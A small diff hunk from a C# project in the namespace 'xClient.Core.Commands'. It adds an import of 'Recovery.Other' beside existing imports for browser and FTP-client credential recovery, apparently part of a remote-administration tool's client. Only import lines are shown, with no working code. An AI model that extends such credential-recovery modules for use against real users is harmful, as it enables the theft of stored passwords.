@@ -12,6 +12,7 @@ using System.Collections.Generic;
 using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
+using xClient.Core.Recovery.Other;
 
 namespace xClient.Core.Commands
 {
